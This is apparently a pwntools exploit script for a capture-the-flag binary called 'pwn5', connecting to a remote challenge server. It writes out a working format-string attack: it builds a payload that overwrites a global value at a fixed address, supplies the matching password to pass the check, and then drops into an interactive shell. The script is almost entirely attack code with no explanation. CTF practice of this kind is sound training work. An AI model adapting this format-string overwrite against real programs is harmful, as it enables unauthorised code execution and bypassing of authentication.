#!  /usr/bin/env python
from pwn import *

#sh = process("./pwn5")
sh = remote("node3.buuoj.cn",29412)
elf = ELF("./pwn5")

context.log_level = "debug"

random = 0x0804C044
payload = p32(random) + "%10$s"
print payload

#random_num = u32(sh.recv()[4:8])
#log.info("num -> " + hex(random_num))
#gdb.attach(sh)
#print random_num
#sh.sendline(str(random_num))
sh.recvuntil("your name:")
payload = fmtstr_payload(10,{random:0x1000})
sh.sendline(payload)
sh.recvuntil("passwd")
sh.sendline(str(0x1000))

sh.interactive()
